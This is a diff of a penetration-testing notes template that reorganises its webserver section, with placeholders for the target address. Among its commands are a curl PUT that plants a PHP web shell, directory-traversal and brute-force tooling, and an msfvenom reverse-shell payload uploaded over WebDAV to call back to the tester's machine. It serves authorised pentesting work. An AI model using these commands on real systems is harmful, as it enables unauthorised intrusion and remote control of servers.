@@ -274,11 +274,10 @@ hydra -I -t 4 -L /root/Dropbox/Wordlists/quick_hit.txt -P /root/Dropbox/Wordlist
 
 ### Webservers ######################################################################################################################
 
+#### Automated Checks
+
 INSERTWIGSCAN
 
-```
-wig-git http://INSERTIPADDRESS/path
-```
 #### Nikto scan
 
 INSERTNIKTOSCAN
@@ -287,53 +286,10 @@ INSERTNIKTOSCAN
 
 INSERTDIRBSCAN
 
-#### Manual Scan
-
-```
-Step 1:
-View Source!
-
-Step 2: 
-Robots.txt!
-```
-wig-git -a -q -t 5 INSERTIPADDRESS
- --proxy PROXY 
+#### Robots
 
 INSERTROBOTS
-```
-Step 3: 
-Browse around and look for disclosed PII on site
 
-*Place anything here
-```
-
-
-
-```
-# CMS checker 
-wig-git http://INSERTIPADDRESS -a -m
-cmsmap-git -t http://INSERTIPADDRESS
-
-# Nikto
-nikto -h http://INSERTIPADDRESS
-
-# Nikto with squid proxy
-nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
-
-# Get header
-curl -i INSERTIPADDRESS
-
-# Get everything
-curl -i -L INSERTIPADDRESS
-
-# Check if it is possible to upload using put
-curl -v -X OPTIONS http://INSERTIPADDRESS/
-curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
-
-# Check for title and all links
-dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
-
-```
 
 #### Default/Weak login
 
@@ -358,26 +314,60 @@ root nameofservice
 <username if you have> username
 <username if you have> nameofservice
 ```
+```
+Step 3: 
+Browse around and look for disclosed PII on site
 
-#### Url brute force
+*Place anything here
+```
+
+#### Manual Checks
 
 ```
-# Dirb
-dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt
+Step 1:
+View Source
+
+Step 2: 
+Start Secondary Scans
+```
+
+wig-git http://INSERTIPADDRESS/path
+
+```
+# CMS checker 
+cmsmap-git -t http://INSERTIPADDRESS
+
+#Full Nikto
+nikto -h http://INSERTIPADDRESS
+
+# Nikto with squid proxy
+nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
+
+# Get header
+curl -i INSERTIPADDRESS
+
+# Get everything
+curl -i -L INSERTIPADDRESS
+
+# Check if it is possible to upload using put
+curl -v -X OPTIONS http://INSERTIPADDRESS/
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
+
+# Check for title and all links
+dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
 
 #To append a .pl to the end of the resolutions:
 dirb http://INSERTIPADDRESS/somedirectory -X .pl
 
-# Gobuster - remove relevant responde codes (403 for example)
-gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
 ```
 
 #### WebDav
 
 ```
-cadaver INSERTIPADDRESS
 Try to put a shell.asp
 cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
+
+cadaver INSERTIPADDRESS
 
 put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.asp
 If the .asp extention is not allowed, try shell.asp.txt and use the mv command
